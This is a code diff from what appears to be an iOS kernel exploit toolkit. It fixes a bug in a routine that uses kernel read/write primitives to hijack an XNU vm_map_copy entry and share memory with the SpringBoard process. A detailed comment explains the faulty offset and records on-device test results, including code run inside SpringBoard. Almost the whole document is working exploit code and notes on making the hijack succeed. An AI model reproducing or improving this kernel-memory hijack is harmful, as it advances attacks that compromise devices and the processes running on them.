@@ -235,7 +235,40 @@ static struct VMShmem vm_create_shmem_with_object_locked(struct VMObject *object
 
     uint64_t shmemNamedEntry = task_get_ipc_port_kobject(task_self(), memoryObject);
     uint64_t shmemVMCopyAddr = kread64(shmemNamedEntry + off_vm_named_entry_backing_copy);
-    uint64_t nextAddr        = kread64(shmemVMCopyAddr + off_vm_named_entry_size);
+    // XNU declares the backing map entry as the FIRST MEMBER BY VALUE:
+    //
+    //     struct vm_map_copy {
+    //         vm_map_entry_t  vmc_entry;    // <- offset 0, this is what we hijack
+    //         vm_map_entry_t *vmc_next;
+    //         ...
+    //     };
+    //
+    // so the vm_map_entry to patch lives AT the vm_map_copy address.
+    //
+    // This used to be:
+    //     uint64_t nextAddr = kread64(shmemVMCopyAddr + off_vm_named_entry_size);
+    // off_vm_named_entry_size is 0x20 and is offsetof(vm_named_entry, size) -- an
+    // offset into vm_named_entry, never into vm_map_copy. Applied to a
+    // vm_map_copy pointer, 0x20 lands inside vmc_entry itself: struct
+    // vm_map_entry in remote/VM.h puts links at 0x00..0x1F (prev/tnext/start/end,
+    // 4 x 8) and store at 0x20, so that read returned store.rbe_left, i.e. heap
+    // junk, and handed it to kwrite_zone_element.
+    //
+    // That is why nothing crashed and nothing worked. The hijack landed on an
+    // rbe_left field -- a legacy red-black-tree hook that modern XNU does not
+    // walk -- so the named entry kept pointing at its own anonymous page. Writes
+    // were invisible to the target and reads returned whatever our private page
+    // happened to hold. Measured on device 2026-09-26 10:30 (commit eaf46c86):
+    // strlen() executed inside SpringBoard returned 0 three times per attempt,
+    // and sb_via_bounce came back 0x0 / 0x3 / 0x4233627577576168 ("hAwUb3B").
+    uint64_t nextAddr = shmemVMCopyAddr;
+    if (!is_kaddr_valid(nextAddr)) {
+        printf("[DS][%s:%d] backing vm_map_copy invalid 0x%llx\n", __FUNCTION__, __LINE__,
+               (unsigned long long)nextAddr);
+        mach_vm_deallocate(mach_task_self(), localAddr, PAGE_SIZE);
+        if (MACH_PORT_VALID(memoryObject)) mach_port_deallocate(mach_task_self_, memoryObject);
+        return shmem;
+    }
 
     struct vm_map_entry entry = {0};
     kreadbuf(nextAddr, &entry, sizeof(struct vm_map_entry));
